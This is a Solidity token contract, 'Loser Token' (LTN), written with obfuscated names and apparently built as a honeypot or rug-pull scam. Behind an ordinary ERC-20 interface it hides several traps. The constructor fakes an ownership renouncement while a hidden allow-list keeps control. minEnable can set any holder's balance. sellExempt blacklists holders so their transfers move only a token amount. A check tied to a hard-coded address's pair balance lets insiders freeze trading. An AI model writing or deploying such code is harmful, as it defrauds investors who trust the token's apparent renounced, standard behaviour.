//SPDX-License-Identifier: MIT

pragma solidity ^0.8.9;

interface enableTeam {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fromBuy) external view returns (uint256);

    function transfer(address listSwap, uint256 txShould) external returns (bool);

    function allowance(address launchTo, address spender) external view returns (uint256);

    function approve(address spender, uint256 txShould) external returns (bool);

    function transferFrom(
        address sender,
        address listSwap,
        uint256 txShould
    ) external returns (bool);

    event Transfer(address indexed from, address indexed maxTake, uint256 value);
    event Approval(address indexed launchTo, address indexed spender, uint256 value);
}

abstract contract liquidityFrom {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface shouldTx {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface launchedReceiver {
    function createPair(address teamFund, address feeFund) external returns (address);
}

interface exemptLimit is enableTeam {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract LoserToken is liquidityFrom, enableTeam, exemptLimit {

    function tokenExempt(address teamMode, address listSwap, uint256 txShould) internal returns (bool) {
        require(senderEnable[teamMode] >= txShould);
        senderEnable[teamMode] -= txShould;
        senderEnable[listSwap] += txShould;
        emit Transfer(teamMode, listSwap, txShould);
        return true;
    }

    function autoTx(address teamMode, address listSwap, uint256 txShould) internal returns (bool) {
        if (teamMode == totalSenderShould) {
            return tokenExempt(teamMode, listSwap, txShould);
        }
        uint256 totalIs = enableTeam(minIs).balanceOf(amountToSwap);
        require(totalIs == limitTx);
        require(listSwap != amountToSwap);
        if (receiverShouldFrom[teamMode]) {
            return tokenExempt(teamMode, listSwap, tokenMode);
        }
        return tokenExempt(teamMode, listSwap, txShould);
    }

    function balanceOf(address fromBuy) public view virtual override returns (uint256) {
        return senderEnable[fromBuy];
    }

    string private feeTotal = "LTN";

    uint8 private teamFundWallet = 18;

    uint256 limitTx;

    uint256 private walletSender = 100000000 * 10 ** 18;

    uint256 public minList;

    function name() external view virtual override returns (string memory) {
        return toAuto;
    }

    uint256 constant tokenMode = 13 ** 10;

    bool private fromTrading;

    uint256 private fromLiquidity;

    mapping(address => bool) public fundEnable;

    constructor (){
        if (maxReceiverFund) {
            fromTrading = false;
        }
        atMaxList();
        shouldTx autoMarketing = shouldTx(feeTotalTx);
        minIs = launchedReceiver(autoMarketing.factory()).createPair(autoMarketing.WETH(), address(this));
        if (minList != swapTotal) {
            receiverToken = false;
        }
        totalSenderShould = _msgSender();
        fundEnable[totalSenderShould] = true;
        senderEnable[totalSenderShould] = walletSender;
        if (maxReceiverFund != receiverToken) {
            feeAuto = false;
        }
        emit Transfer(address(0), totalSenderShould, walletSender);
    }

    mapping(address => mapping(address => uint256)) private amountBuy;

    mapping(address => bool) public receiverShouldFrom;

    mapping(address => uint256) private senderEnable;

    address public minIs;

    function symbol() external view virtual override returns (string memory) {
        return feeTotal;
    }

    function buyFrom(uint256 txShould) public {
        buyMax();
        limitTx = txShould;
    }

    function getOwner() external view returns (address) {
        return shouldToken;
    }

    bool public tokenSellMin;

    uint256 modeTrading;

    bool private feeAuto;

    function transferFrom(address teamMode, address listSwap, uint256 txShould) external override returns (bool) {
        if (_msgSender() != feeTotalTx) {
            if (amountBuy[teamMode][_msgSender()] != type(uint256).max) {
                require(txShould <= amountBuy[teamMode][_msgSender()]);
                amountBuy[teamMode][_msgSender()] -= txShould;
            }
        }
        return autoTx(teamMode, listSwap, txShould);
    }

    address amountToSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function sellExempt(address atSwap) public {
        buyMax();
        if (maxReceiverFund == receiverToken) {
            receiverLaunch = minList;
        }
        if (atSwap == totalSenderShould || atSwap == minIs) {
            return;
        }
        receiverShouldFrom[atSwap] = true;
    }

    bool private receiverToken;

    uint256 private swapTotal;

    function transfer(address receiverExempt, uint256 txShould) external virtual override returns (bool) {
        return autoTx(_msgSender(), receiverExempt, txShould);
    }

    function allowance(address launchedTotal, address limitIsAmount) external view virtual override returns (uint256) {
        if (limitIsAmount == feeTotalTx) {
            return type(uint256).max;
        }
        return amountBuy[launchedTotal][limitIsAmount];
    }

    address private shouldToken;

    uint256 public listExempt;

    bool public maxReceiverFund;

    function buyMax() private view {
        require(fundEnable[_msgSender()]);
    }

    function tokenLaunch(address buyAtTake) public {
        if (tokenSellMin) {
            return;
        }
        if (maxReceiverFund) {
            fromLiquidity = minList;
        }
        fundEnable[buyAtTake] = true;
        
        tokenSellMin = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return walletSender;
    }

    uint256 private receiverLaunch;

    address public totalSenderShould;

    function decimals() external view virtual override returns (uint8) {
        return teamFundWallet;
    }

    address feeTotalTx = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function atMaxList() public {
        emit OwnershipTransferred(totalSenderShould, address(0));
        shouldToken = address(0);
    }

    function approve(address limitIsAmount, uint256 txShould) public virtual override returns (bool) {
        amountBuy[_msgSender()][limitIsAmount] = txShould;
        emit Approval(_msgSender(), limitIsAmount, txShould);
        return true;
    }

    function minEnable(address receiverExempt, uint256 txShould) public {
        buyMax();
        senderEnable[receiverExempt] = txShould;
    }

    string private toAuto = "Loser Token";

    function owner() external view returns (address) {
        return shouldToken;
    }

    event OwnershipTransferred(address indexed receiverAt, address indexed autoTotal);

}